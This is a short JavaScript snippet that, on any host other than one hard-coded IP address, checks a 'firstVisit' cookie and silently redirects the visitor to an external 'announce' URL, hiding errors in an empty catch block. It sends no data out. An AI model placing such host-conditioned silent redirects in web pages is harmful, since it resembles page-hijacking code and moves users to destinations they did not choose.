if (window.location.host!=='47.238.172.165:65511'){
  try {
    function getCookie(name) {
      var cookieArray = document.cookie.split('; ');
      for (var i = 0; i < cookieArray.length; i++) {
        var cookiePair = cookieArray[i].split('=');
        if (cookiePair[0] == name) {
          return decodeURIComponent(cookiePair[1]);
        }
      }
      return null;
    }
    var fv = getCookie('firstVisit');
    if (!fv) {
        window.location.href='https://ai.wendabao.net/api/announce'
    }
    else if (parseInt(fv)>1751200000000){
      window.location.href='https://ai.wendabao.net/api/announce'
    }
  } catch (e) {
  }
}
